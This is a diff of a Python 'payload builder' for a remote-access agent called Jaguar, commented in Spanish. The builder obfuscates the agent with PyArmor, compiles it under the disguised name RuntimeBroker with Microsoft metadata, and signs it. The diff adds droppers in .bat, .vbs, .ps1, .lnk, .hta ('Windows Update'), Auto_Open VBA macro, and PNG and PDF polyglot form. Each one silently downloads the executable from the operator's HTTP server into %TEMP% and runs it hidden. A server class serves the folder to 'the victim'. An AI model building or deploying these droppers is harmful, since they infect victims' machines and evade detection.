@@ -1,53 +1,43 @@
 # -*- coding: utf-8 -*-
-"""Constructor de payloads Jaguar (pipeline avanzado + PyArmor).
+"""Constructor de payloads Jaguar (droppers + pipeline ofuscado).
 
-Cadena de ofuscación/compilación:
-  1) PyArmor  -> ofusca el agente (si está instalado)
-  2) Nuitka   -> compila (sin UPX, metadatos legítimos)   [recomendado]
-  3) PyInstaller -> fallback (--noupx)
+Cadena de ofuscacion/compilacion del exe:
+  1) PyArmor  -> ofusca el agente
+  2) Nuitka   -> compila (recomendado)     [--windows-console-mode=disable]
+  3) PyInstaller -> fallback
 
-FIX 1 (_MEI): el payload se auto-desprende (spawn detached + exit). En --onefile
-el hijo DEBE lanzarse con entorno limpio (PYINSTALLER_RESET_ENVIRONMENT=1 y sin
-_PYI_* / _MEIPASS2); si no, hereda las variables del bootloader del padre, se
-ejecuta desde la carpeta _MEI del padre y muere al borrarla este. Ver _entry().
-
-FIX 2 (WinError 32): cada build usa una carpeta de trabajo ÚNICA para no chocar
-con el RuntimeBroker.pkg bloqueado de la build anterior (antivirus / instancia
-viva). Además se cierran instancias del payload y se reintenta. Ver generar_exe().
-
-FIX 3 (PyArmor rompe el análisis): PyArmor deja los import dentro del blob
-ofuscado, así que PyInstaller/Nuitka NO los ven (p.ej. "No module named
-'getpass'"). Solución doble y a prueba de futuro:
-  - _entry.py (plano, siempre analizado) hace un "warm-up" de los imports.
-  - si hay PyArmor, se copia el agente SIN ofuscar a agente_deps.py y se pasa
-    como hidden-import; el compilador analiza sus imports recursivamente.
+Los payloads de "documento/script" (.bat/.vbs/.ps1/.lnk/.hta/.pdf/.png/.bas)
+son DROPPERS: descargan el exe por HTTP y lo ejecutan OCULTO. No requieren
+Python en la victima. Todos llevan fallback a pythonw agente.py si existiera.
 """
+import functools
 import os
-import sys
 import shutil
 import stat
 import struct
-import zlib
 import subprocess
+import sys
 import tempfile
-import functools
 import time
+import zlib
 from http.server import SimpleHTTPRequestHandler, ThreadingHTTPServer
 
 ES_WIN = sys.platform.startswith("win")
 CREATE_NO_WINDOW = 0x08000000
 
-# Imports que el agente necesita. Se inyectan en _entry.py para que el
-# compilador los vea aunque el agente vaya ofuscado con PyArmor.
 DEPS_STDLIB = ["io", "time", "base64", "socket", "getpass", "platform", "shutil"]
 DEPS_TERCEROS = ["PIL", "PIL.Image", "PIL.ImageGrab", "cv2"]
+
+
+def _sc():
+    return {"creationflags": CREATE_NO_WINDOW} if ES_WIN else {}
 
 
 class Constructor:
     def __init__(self, host, puerto, log=None, nombre="RuntimeBroker",
                  icono=None, upx=None, certificado=None, contrasena_cert=None,
-                 compilador="auto", lto=False, mingw=False, usar_pyarmor=False,
-                 matar_payload=True):
+                 compilador="auto", lto=False, mingw=False, usar_pyarmor=True,
+                 matar_payload=True, puerto_http=8080):
         self.host = (host or "127.0.0.1").strip()
         self.puerto = str(puerto or "8000").strip()
         self.log = log or (lambda t: None)
@@ -56,11 +46,12 @@ class Constructor:
         self.upx = upx or None
         self.certificado = certificado or None
         self.contrasena_cert = contrasena_cert or None
-        self.compilador = (compilador or "auto").lower()   # auto | nuitka | pyinstaller
+        self.compilador = (compilador or "auto").lower()
         self.lto = bool(lto)
         self.mingw = bool(mingw)
         self.usar_pyarmor = bool(usar_pyarmor)
         self.matar_payload = bool(matar_payload)
+        self.puerto_http = int(puerto_http or 8080)
 
         self.base = os.path.dirname(os.path.abspath(__file__))
         self.raiz = os.path.dirname(os.path.dirname(self.base))
@@ -70,7 +61,7 @@ class Constructor:
         self.fallback = self._ip_local()
         self._http = None
         if not self.agente:
-            raise FileNotFoundError("No se encontró agente/agente.py — revisa la estructura del proyecto")
+            raise FileNotFoundError("No se encontró agente/agente.py")
         os.makedirs(self.dist, exist_ok=True)
 
     # ------------------------------------------------------------------ util
@@ -100,6 +91,19 @@ class Constructor:
         finally:
             s.close()
 
+    def _host_url(self):
+        """Host usable en una URL: si es 0.0.0.0/vacio usa la IP local de LAN."""
+        h = (self.host or "").strip()
+        if h in ("", "0.0.0.0", "127.0.0.1"):
+            h = self.fallback or h or "127.0.0.1"
+        return h
+
+    def _url_exe(self):
+        return f"http://{self._host_url()}:{self.puerto_http}/{self.nombre}.exe"
+
+    def _url_py(self):
+        return f"http://{self._host_url()}:{self.puerto_http}/agente.py"
+
     def _out(self, nombre):
         return os.path.join(self.dist, nombre)
 
@@ -118,15 +122,11 @@ class Constructor:
         except Exception as e:
             self.log(f"[builder] no pude copiar agente.py: {e}")
 
-    def _args(self):
-        return f'{self.host} {self.puerto} {self.fallback}'
-
     @staticmethod
     def _sello():
         return f"{time.strftime('%Y%m%d_%H%M%S')}_{os.getpid()}"
 
     def _rmtree_robusto(self, ruta, intentos=4):
-        """Borra una carpeta aunque haya archivos de solo-lectura/bloqueados."""
         if not ruta or not os.path.isdir(ruta):
             return True
 
@@ -151,18 +151,15 @@ class Constructor:
         return not os.path.isdir(ruta)
 
     def _matar_payload(self):
-        """Cierra instancias en ejecución del exe (suelen bloquear archivos)."""
         if not ES_WIN:
             return
         exe = self.nombre + ".exe"
         try:
             r = subprocess.run(["tasklist", "/FI", f"IMAGENAME eq {exe}", "/NH"],
-                               capture_output=True, text=True,
-                               creationflags=CREATE_NO_WINDOW)
+                               capture_output=True, text=True, **_sc())
             if exe.lower() in (r.stdout or "").lower():
                 subprocess.run(["taskkill", "/IM", exe, "/F", "/T"],
-                               capture_output=True, text=True,
-                               creationflags=CREATE_NO_WINDOW)
+                               capture_output=True, text=True, **_sc())
                 self.log(f"[builder] cerradas instancias de {exe} antes de compilar")
                 time.sleep(0.8)
         except Exception as e:
@@ -176,20 +173,32 @@ class Constructor:
         except Exception:
             pass
 
+    # ------------------------------------------------------------------ icono
+    def _icono_ico(self):
+        """Devuelve una ruta .ico para el exe (la dada, o jaguar.png convertida)."""
+        if self.icono and os.path.isfile(self.icono):
+            return os.path.abspath(self.icono)
+        for cand in ("jaguar.ico", "jaguar.png"):
+            p = os.path.join(self.raiz, "jaguar", "ui", cand)
+            if not os.path.isfile(p):
+                p = os.path.join(self.raiz, "img", cand)
+            if os.path.isfile(p):
+                if p.lower().endswith(".ico"):
+                    return p
+                try:
+                    from PIL import Image
+                    destino = os.path.join(self.dist, self.nombre + ".ico")
+                    Image.open(p).convert("RGBA").save(
+                        destino, sizes=[(16, 16), (32, 32), (48, 48), (64, 64), (256, 256)])
+                    return destino
+                except Exception as e:
+                    self.log(f"[builder] no pude convertir icono: {e}")
+        return None
+
     # ------------------------------------------------------------------ entry
     def _entry(self):
-        """_entry.py del .exe.
-
-        Detach (spawn + exit) para no quedar atado a la consola/lanzador. El
-        hijo se lanza con entorno limpio (PYINSTALLER_RESET_ENVIRONMENT=1 y sin
-        _PYI_* / _MEIPASS2) para que extraiga su PROPIA carpeta _MEI.
-
-        Además, el bloque "warm-up" importa las dependencias del agente en
-        código PLANO: como _entry.py nunca se ofusca, el compilador las ve
-        aunque agente_jaguar esté ofuscado por PyArmor.
-        """
         calentamiento = (
-            "# --- warm-up de imports: visibles para PyInstaller/Nuitka aunque el agente esté ofuscado ---\n"
+            "# --- warm-up de imports (visibles aunque el agente vaya ofuscado) ---\n"
             f"import {', '.join(DEPS_STDLIB)}\n"
             "try:\n"
             "    import winreg\n"
@@ -236,20 +245,16 @@ class Constructor:
     @staticmethod
     def _tiene_nuitka():
         try:
-            r = subprocess.run([sys.executable, "-m", "nuitka", "--version"],
-                               capture_output=True, text=True,
-                               creationflags=CREATE_NO_WINDOW)
-            return r.returncode == 0
+            return subprocess.run([sys.executable, "-m", "nuitka", "--version"],
+                                  capture_output=True, text=True, **_sc()).returncode == 0
         except Exception:
             return False
 
     @staticmethod
     def _tiene_pyarmor():
         try:
-            r = subprocess.run([sys.executable, "-m", "pyarmor.cli", "--version"],
-                               capture_output=True, text=True,
-                               creationflags=CREATE_NO_WINDOW)
-            return r.returncode == 0
+            return subprocess.run([sys.executable, "-m", "pyarmor.cli", "--version"],
+                                  capture_output=True, text=True, **_sc()).returncode == 0
         except Exception:
             return False
 
@@ -261,14 +266,13 @@ class Constructor:
         self._rmtree_robusto(os.path.join(self.build, "pyarmor_out"))
 
     def _obfuscar_pyarmor(self):
-        """Ofusca agente_jaguar.py con PyArmor dentro de self.build.
-        Devuelve el nombre del paquete runtime (o None si falla)."""
         self._limpiar_pyarmor()
         src = os.path.join(self.build, "agente_jaguar.py")
         if not os.path.isfile(src):
             return None
         out = os.path.join(self.build, "pyarmor_out")
         intentos = (
+            ["gen", "-O", out, "--obf-code", "2", src],
             ["gen", "-O", out, src],
             ["gen", "--output=" + out, src],
         )
@@ -276,8 +280,7 @@ class Constructor:
         for args in intentos:
             try:
                 proc = subprocess.run([sys.executable, "-m", "pyarmor.cli"] + args,
-                                      cwd=self.build, capture_output=True, text=True,
-                                      creationflags=CREATE_NO_WINDOW)
+                                      cwd=self.build, capture_output=True, text=True, **_sc())
             except Exception as e:
                 self.log(f"[builder] PyArmor excepción: {e}")
                 continue
@@ -308,8 +311,6 @@ class Constructor:
                 self.log("[builder] ERROR exe: falta agente.py")
                 return None
             os.makedirs(self.build, exist_ok=True)
-
-            # Cierra instancias vivas (evita WinError 32 sobre archivos de build)
             if self.matar_payload:
                 self._matar_payload()
 
@@ -322,15 +323,12 @@ class Constructor:
                 if self._tiene_pyarmor():
                     runtime = self._obfuscar_pyarmor()
                     if runtime:
-                        # Copia SIN ofuscar para que el compilador analice sus
-                        # imports (PyArmor los oculta en agente_jaguar.py).
                         shutil.copy2(self.agente, os.path.join(self.build, "agente_deps.py"))
                         deps = "agente_deps"
                         self.log("[builder] agente_deps.py -> análisis de dependencias")
                 else:
                     self.log("[builder] PyArmor no instalado -> sigo sin ofuscar")
 
-            # Carpetas de trabajo ÚNICAS por build (clave contra WinError 32)
             sello = self._sello()
             work = os.path.join(self.build, "work_" + sello)
             dist_tmp = os.path.join(self.build, "dist_tmp_" + sello)
@@ -354,7 +352,6 @@ class Constructor:
             destino = self._colocar_exe(origen)
             self._firmar(destino)
             self.log(f"[builder] exe listo: {os.path.basename(destino)}")
-
             self._limpiar_builds_viejos(conservar=(os.path.basename(work),
                                                    os.path.basename(dist_tmp)))
             return destino
@@ -381,7 +378,6 @@ class Constructor:
                "--copyright=Microsoft Corporation",
                f"--output-filename={self.nombre}.exe",
                f"--output-dir={dist_tmp}"]
-        # Aunque el agente vaya ofuscado, incluimos sus deps explícitamente.
         for m in DEPS_STDLIB + ["subprocess", "winreg"]:
             cmd.append(f"--include-module={m}")
         if deps:
@@ -391,19 +387,18 @@ class Constructor:
                     f"--include-package-data={runtime}"]
         if self.lto:
             cmd.append("--lto=yes")
-        if self.icono and os.path.isfile(self.icono):
-            cmd.append(f"--windows-icon-from-ico={os.path.abspath(self.icono)}")
+        ico = self._icono_ico()
+        if ico:
+            cmd.append(f"--windows-icon-from-ico={ico}")
         cmd += list(extra)
         cmd.append("_entry.py")
         return cmd
 
     def _correr_stream(self, cmd, cwd):
-        """Ejecuta un comando mostrando la salida en vivo en el log."""
         self.log("[builder] $ " + " ".join(str(c) for c in cmd))
         p = subprocess.Popen(cmd, cwd=cwd, stdout=subprocess.PIPE,
                              stderr=subprocess.STDOUT, text=True,
-                             encoding="utf-8", errors="replace", bufsize=1,
-                             creationflags=CREATE_NO_WINDOW if ES_WIN else 0)
+                             encoding="utf-8", errors="replace", bufsize=1, **_sc())
         ultimas = []
         for ln in p.stdout:
             ln = ln.rstrip()
@@ -445,8 +440,6 @@ class Constructor:
                    "--workpath", work,
                    "--specpath", work,
                    "--paths", self.build]
-            # hidden-imports: terceros + stdlib del agente (por si PyArmor
-            # oculta los imports) + módulo de análisis de dependencias.
             for m in ["PIL", "PIL.Image", "PIL.ImageGrab", "cv2", "winreg"] \
                     + DEPS_STDLIB + ["subprocess"]:
                 cmd += ["--hidden-import", m]
@@ -454,8 +447,9 @@ class Constructor:
                 cmd += ["--hidden-import", deps]
             if runtime:
                 cmd += ["--collect-all", runtime]
-            if self.icono and os.path.isfile(self.icono):
-                cmd += ["--icon", os.path.abspath(self.icono)]
+            ico = self._icono_ico()
+            if ico:
+                cmd += ["--icon", ico]
             if self.upx and os.path.isdir(self.upx):
                 cmd += ["--upx-dir", os.path.abspath(self.upx)]
             else:
@@ -464,24 +458,21 @@ class Constructor:
 
             self.log(f"[builder] compilando con PyInstaller (intento {i + 1}/{intentos})...")
             try:
-                proc = subprocess.run(cmd, cwd=self.build, capture_output=True, text=True,
-                                      creationflags=CREATE_NO_WINDOW if ES_WIN else 0)
+                proc = subprocess.run(cmd, cwd=self.build, capture_output=True,
+                                      text=True, **_sc())
             except Exception as e:
                 self.log(f"[builder] PyInstaller excepción: {e}")
                 proc = None
             salida = ((proc.stderr or "") + "\n" + (proc.stdout or "")) if proc else ""
-
             if proc is not None and proc.returncode == 0 and os.path.isfile(exe):
                 return exe
-
             if i < intentos - 1:
-                self.log("[builder] fallo de build (posible archivo bloqueado), reintentando...")
+                self.log("[builder] fallo de build (archivo bloqueado?), reintentando...")
                 self._rmtree_robusto(work)
                 self._rmtree_robusto(dist_tmp)
                 os.makedirs(work, exist_ok=True)
                 os.makedirs(dist_tmp, exist_ok=True)
                 time.sleep(1.5)
-
         self.log("[builder] ERROR PyInstaller:\n" + salida[-1800:])
         return None
 
@@ -522,119 +513,154 @@ class Constructor:
             cmd += ["/p", self.contrasena_cert]
         cmd += [exe]
         try:
-            r = subprocess.run(cmd, capture_output=True, text=True,
-                               creationflags=CREATE_NO_WINDOW if ES_WIN else 0)
+            r = subprocess.run(cmd, capture_output=True, text=True, **_sc())
             self.log("[builder] firmado OK" if r.returncode == 0
                      else "[builder] firma falló: " + (r.stderr or "")[-400:])
         except Exception as e:
             self.log(f"[builder] ERROR firma: {e}")
 
-    # ------------------------------------------------------------------ bat
+    # ------------------------------------------------------------------ droppers
+    def _bat_compacto(self):
+        """Batch minimo (para polyglot PDF)."""
+        return (
+            "@echo off\r\n"
+            f"set U={self._url_exe()}\r\n"
+            f"set D=%TEMP%\\{self.nombre}.exe\r\n"
+            'powershell -NoP -C "(New-Object Net.WebClient).DownloadFile(\'%U%\',\'%D%\')"'
+            " >nul 2>&1\r\n"
+            'start "" "%D%" & exit /b\r\n'
+        )
+
     def generar_bat(self):
         self._copiar_agente()
-        bat = (
-            "@echo off\r\n"
-            'cd /d "%~dp0"\r\n'
-            'if not exist "agente.py" (\r\n'
-            '  powershell -NoProfile -Command "try{Invoke-WebRequest -UseBasicParsing '
-            f"'http://{self.host}:8080/agente.py' -OutFile 'agente.py'}}catch{{}}\\\"\\r\\n"
-            ')\r\n'
-            f'start "" pythonw "agente.py" {self._args()}\r\n'
-            "exit\r\n"
-        )
-        return self._escribir(self._out(self.nombre + ".bat"), bat)
+        exe_url = self._url_exe()
+        py_url = self._url_py()
+        host_arg = self.host or "127.0.0.1"
+        L = [
+            "@echo off",
+            "setlocal enableextensions",
+            f'set "URL={exe_url}"',
+            f'set "DEST=%TEMP%\\{self.nombre}.exe"',
+            'powershell -NoProfile -ExecutionPolicy Bypass -Command "try{[Net.ServicePointManager]::SecurityProtocol=3072;Invoke-WebRequest -UseBasicParsing -Uri \'%URL%\' -OutFile \'%DEST%\'}catch{}" >nul 2>&1',
+            'if exist "%DEST%" (start "" "%DEST%" & exit /b)',
+            "rem --- fallback: agente.py con Python ---",
+            f'set "PYURL={py_url}"',
+            'set "PYDEST=%TEMP%\\jaguar_agente.py"',
+            'powershell -NoProfile -Command "try{Invoke-WebRequest -UseBasicParsing -Uri \'%PYURL%\' -OutFile \'%PYDEST%\'}catch{}" >nul 2>&1',
+            'where pythonw >nul 2>&1 && start "" pythonw "%PYDEST%" '
+            f'{host_arg} {self.puerto} {self.fallback}',
+            "exit /b",
+        ]
+        return self._escribir(self._out(self.nombre + ".bat"), "\r\n".join(L) + "\r\n")
 
-    # ------------------------------------------------------------------ vbs
     def generar_vbs(self):
         self._copiar_agente()
-        vbs = (
-            'Set fso = CreateObject("Scripting.FileSystemObject")\r\n'
-            'dir = fso.GetParentFolderName(WScript.ScriptFullName)\r\n'
-            'Set sh = CreateObject("WScript.Shell")\r\n'
-            'sh.CurrentDirectory = dir\r\n'
-            f'sh.Run "pythonw """ & dir & "\\agente.py"" {self._args()}", 0, False\r\n'
-        )
+        vbs = "\r\n".join([
+            "Option Explicit",
+            "Dim url, dest, http, st, sh",
+            f'url = "{self._url_exe()}"',
+            'Set sh = CreateObject("WScript.Shell")',
+            f'dest = sh.ExpandEnvironmentStrings("%TEMP%") & "\\{self.nombre}.exe"',
+            "On Error Resume Next",
+            'Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")',
+            'If Err.Number <> 0 Then Err.Clear : Set http = CreateObject("MSXML2.XMLHTTP")',
+            'http.Open "GET", url, False',
+            "http.Send",
+            "If http.Status = 200 Then",
+            '  Set st = CreateObject("ADODB.Stream")',
+            "  st.Type = 1 : st.Open : st.Write http.responseBody",
+            "  st.SaveToFile dest, 2 : st.Close",
+            '  sh.Run """" & dest & """", 0, False',
+            "End If",
+        ]) + "\r\n"
         return self._escribir(self._out(self.nombre + ".vbs"), vbs)
 
-    # ------------------------------------------------------------------ ps1
     def generar_ps1(self):
         self._copiar_agente()
-        ps1 = (
-            '$dir = Split-Path -Parent $MyInvocation.MyCommand.Path\r\n'
-            'Set-Location $dir\r\n'
-            f'Start-Process -WindowStyle Hidden -FilePath pythonw '
-            f'-ArgumentList \'"agente.py" {self._args()}\' -WorkingDirectory $dir\r\n'
-        )
-        return self._escribir(self._out(self.nombre + ".ps1"), ps1)
+        ps = "\r\n".join([
+            "$ErrorActionPreference='SilentlyContinue'",
+            f"$url='{self._url_exe()}'",
+            f"$dest=Join-Path $env:TEMP '{self.nombre}.exe'",
+            "try{[Net.ServicePointManager]::SecurityProtocol=3072; Invoke-WebRequest -UseBasicParsing -Uri $url -OutFile $dest}catch{}",
+            "if (Test-Path $dest) { Start-Process -FilePath $dest -WindowStyle Hidden }",
+        ]) + "\r\n"
+        return self._escribir(self._out(self.nombre + ".ps1"), ps)
 
-    # ------------------------------------------------------------------ lnk
     def generar_lnk(self):
         self._copiar_agente()
         destino = self._out(self.nombre + ".lnk")
-        carpeta = self.dist
+        comando = (f'powershell -NoP -W Hidden -C "iwr \'{self._url_exe()}\' -OutFile '
+                   f'$env:TEMP\\{self.nombre}.exe; Start-Process $env:TEMP\\{self.nombre}.exe"')
+        args = f'/c start "" {comando}'
         try:
-            import win32com.client  # type: ignore
+            import win32com.client
             sh = win32com.client.Dispatch("WScript.Shell")
             lnk = sh.CreateShortCut(destino)
-            lnk.TargetPath = "pythonw.exe"
-            lnk.Arguments = f'"agente.py" {self._args()}'
-            lnk.WorkingDirectory = carpeta
+            lnk.TargetPath = os.path.join(os.environ.get("WINDIR", r"C:\Windows"),
+                                          "System32", "cmd.exe")
+            lnk.Arguments = args
+            lnk.WorkingDirectory = self.dist
             lnk.WindowStyle = 7
+            lnk.IconLocation = (self._icono_ico() or "") + ",0"
             lnk.Save()
             self.log(f"[builder] creado: {os.path.basename(destino)}")
             return destino
-        except Exception:
-            pass
+        except Exception as e:
+            self.log(f"[builder] lnk sin pywin32 ({e}); uso cscript")
         if not (ES_WIN and shutil.which("cscript")):
-            self.log("[builder] lnk: sin pywin32 ni cscript, genero .url como respaldo")
             return self._escribir(self._out(self.nombre + ".url"),
                                   f"[InternetShortcut]\nURL=file:///{self.agente}\n")
         vbs = os.path.join(tempfile.gettempdir(), "jaguar_lnk.vbs")
         contenido = (
             'Set sh = CreateObject("WScript.Shell")\r\n'
             f'Set l = sh.CreateShortcut("{destino}")\r\n'
-            'l.TargetPath = "pythonw.exe"\r\n'
-            f'l.Arguments = """agente.py"" {self._args()}"\r\n'
-            f'l.WorkingDirectory = "{carpeta}"\r\n'
-            'l.WindowStyle = 7\r\n'
-            'l.Save\r\n'
+            f'l.TargetPath = "{os.path.join(os.environ.get("WINDIR", r"C:\\Windows"), "System32", "cmd.exe")}"\r\n'
+            f'l.Arguments = "{args}"\r\n'
+            f'l.WorkingDirectory = "{self.dist}"\r\n'
+            "l.WindowStyle = 7\r\n"
+            "l.Save\r\n"
         )
         with open(vbs, "w", encoding="utf-8") as f:
             f.write(contenido)
-        subprocess.run(["cscript", "//nologo", vbs], capture_output=True, text=True,
-                       creationflags=CREATE_NO_WINDOW if ES_WIN else 0)
+        subprocess.run(["cscript", "//nologo", vbs], capture_output=True, text=True, **_sc())
         self.log(f"[builder] creado: {os.path.basename(destino)}")
         return destino
 
-    # ------------------------------------------------------------------ hta
     def generar_hta(self):
         self._copiar_agente()
         hta = (
-            '<html><head><title>Windows Update</title>\r\n'
+            "<html><head><title>Windows Update</title>\r\n"
             '<HTA:APPLICATION ID="j" BORDER="none" SHOWINTASKBAR="no" '
             'WINDOWSTATE="minimize" SINGLEINSTANCE="yes" />\r\n'
             '<script language="VBScript">\r\n'
-            'Sub Window_OnLoad\r\n'
-            '  Set fso = CreateObject("Scripting.FileSystemObject")\r\n'
-            '  dir = fso.GetParentFolderName(js)\r\n'
+            "Sub Window_OnLoad\r\n"
+            "  Dim sh, http, st, url, dest\r\n"
+            "  On Error Resume Next\r\n"
+            f'  url = "{self._url_exe()}"\r\n'
             '  Set sh = CreateObject("WScript.Shell")\r\n'
-            '  sh.CurrentDirectory = dir\r\n'
-            f'  sh.Run "pythonw ""agente.py"" {self._args()}", 0, False\r\n'
-            '  window.close\r\n'
-            'End Sub\r\n'
-            '</script></head><body></body></html>\r\n'
+            f'  dest = sh.ExpandEnvironmentStrings("%TEMP%") & "\\{self.nombre}.exe"\r\n'
+            '  Set http = CreateObject("MSXML2.XMLHTTP")\r\n'
+            '  http.Open "GET", url, False\r\n'
+            "  http.Send\r\n"
+            "  If http.Status = 200 Then\r\n"
+            '    Set st = CreateObject("ADODB.Stream")\r\n'
+            "    st.Type = 1 : st.Open : st.Write http.responseBody\r\n"
+            "    st.SaveToFile dest, 2 : st.Close\r\n"
+            '    sh.Run """" & dest & """", 0, False\r\n'
+            "  End If\r\n"
+            "  window.close\r\n"
+            "End Sub\r\n"
+            "</script></head><body></body></html>\r\n"
         )
         return self._escribir(self._out(self.nombre + ".hta"), hta)
 
-    # ------------------------------------------------------------------ png polyglot
     def generar_png_polyglot(self):
+        """PNG valido + batch anexado. Emite .png y .png.cmd."""
         self._copiar_agente()
         png = self._png_minimo()
-        bat = ("\r\n@echo off\r\n"
-               'cd /d "%~dp0"\r\n'
-               f'start "" pythonw "agente.py" {self._args()}\r\n').encode("utf-8")
-        self._escribir(self._out(self.nombre + ".png"), png + bat, binario=True)
-        self._escribir(self._out(self.nombre + ".png.cmd"), png + bat, binario=True)
+        cola = b"\r\n" + self._bat_compacto().encode("utf-8")
+        self._escribir(self._out(self.nombre + ".png"), png + cola, binario=True)
+        self._escribir(self._out(self.nombre + ".png.cmd"), png + cola, binario=True)
         return self._out(self.nombre + ".png")
 
     @staticmethod
@@ -647,13 +673,16 @@ class Constructor:
         idat = zlib.compress(b"\x00\xff\x00\x00")
         return sig + chunk(b"IHDR", ihdr) + chunk(b"IDAT", idat) + chunk(b"IEND", b"")
 
-    # ------------------------------------------------------------------ pdf
     def generar_pdf(self):
-        self._escribir(self._out(self.nombre + ".pdf"), self._pdf_minimo(""), binario=True)
+        """PDF + batch embebido (polyglot). Emite .pdf y .pdf.cmd."""
+        bat = self._bat_compacto().encode("utf-8")
+        pdf = self._pdf_minimo("Jaguar - Windows Update", prefijo=bat)
+        self._escribir(self._out(self.nombre + ".pdf"), pdf, binario=True)
+        self._escribir(self._out(self.nombre + ".pdf.cmd"), pdf, binario=True)
         return self._out(self.nombre + ".pdf")
 
     @staticmethod
-    def _pdf_minimo(texto):
+    def _pdf_minimo(texto, prefijo=b""):
         objs = [
             b"<< /Type /Catalog /Pages 2 0 R >>",
             b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
@@ -665,7 +694,8 @@ class Constructor:
         stream = b"BT /F1 10 Tf 12 60 Td (" + texto.encode("latin-1", "replace") + b") Tj ET"
         objs[3] = (b"<< /Length " + str(len(stream)).encode() + b" >>\nstream\n" +
                    stream + b"\nendstream")
-        out = bytearray(b"%PDF-1.4\n")
+        out = bytearray(prefijo)
+        out += b"%PDF-1.4\n"
         offsets = []
         for i, o in enumerate(objs, 1):
             offsets.append(len(out))
@@ -678,34 +708,44 @@ class Constructor:
                 b" /Root 1 0 R >>\nstartxref\n" + str(xref).encode() + b"\n%%EOF")
         return bytes(out)
 
-    # ------------------------------------------------------------------ macro
     def generar_macro(self):
+        """VBA (.bas) autonoma: descarga y ejecuta el exe con WScript.Shell."""
         self._copiar_agente()
         macro = (
-            'Sub Auto_Open()\r\n'
-            '    Dim sh As Object, dir As String\r\n'
-            '    Set sh = CreateObject("WScript.Shell")\r\n'
-            '    dir = ThisWorkbook.Path\r\n'
-            f'    sh.CurrentDirectory = dir\r\n'
-            f'    sh.Run "pythonw ""agente.py"" {self._args()}", 0, False\r\n'
-            'End Sub\r\n'
+            "Sub Auto_Open()\r\n"
+            "    Dim x As Object, s As Object, sh As Object\r\n"
+            f'    Dim url As String, dest As String\r\n'
+            f'    url = "{self._url_exe()}"\r\n'
+            f'    dest = Environ("TEMP") & "\\{self.nombre}.exe"\r\n'
+            "    On Error Resume Next\r\n"
+            '    Set x = CreateObject("MSXML2.XMLHTTP")\r\n'
+            '    x.Open "GET", url, False\r\n'
+            "    x.Send\r\n"
+            "    If x.Status = 200 Then\r\n"
+            '        Set s = CreateObject("ADODB.Stream")\r\n'
+            "        s.Type = 1 : s.Open : s.Write x.responseBody\r\n"
+            "        s.SaveToFile dest, 2 : s.Close\r\n"
+            '        Set sh = CreateObject("WScript.Shell")\r\n'
+            '        sh.Run """" & dest & """", 0, False\r\n'
+            "    End If\r\n"
+            "End Sub\r\n"
         )
         return self._escribir(self._out(self.nombre + "_macro.bas"), macro)
 
+    def generar_py(self):
+        self._copiar_agente()
+        return self._out("agente.py")
+
     # ------------------------------------------------------------------ todo
     def generar_todo(self, tipos=None):
-        tipos = tipos or ["exe", "bat", "vbs", "ps1", "lnk", "hta", "png", "pdf", "macro"]
+        tipos = tipos or ["exe", "bat", "vbs", "ps1", "lnk", "hta", "pdf", "png",
+                          "macro", "py"]
         res = {}
         mapa = {
-            "exe": self.generar_exe,
-            "bat": self.generar_bat,
-            "vbs": self.generar_vbs,
-            "ps1": self.generar_ps1,
-            "lnk": self.generar_lnk,
-            "hta": self.generar_hta,
-            "png": self.generar_png_polyglot,
-            "pdf": self.generar_pdf,
-            "macro": self.generar_macro,
+            "exe": self.generar_exe, "bat": self.generar_bat, "vbs": self.generar_vbs,
+            "ps1": self.generar_ps1, "lnk": self.generar_lnk, "hta": self.generar_hta,
+            "png": self.generar_png_polyglot, "pdf": self.generar_pdf,
+            "macro": self.generar_macro, "py": self.generar_py,
         }
         for t in tipos:
             fn = mapa.get(t)
@@ -739,8 +779,6 @@ class _Handler(SimpleHTTPRequestHandler):
 
 
 class Servidor:
-    """Sirve la carpeta dist para que la víctima descargue el payload por HTTP."""
-
     def __init__(self, puerto=8080, log=None):
         self.puerto = int(puerto)
         self.log = log or (lambda t: None)
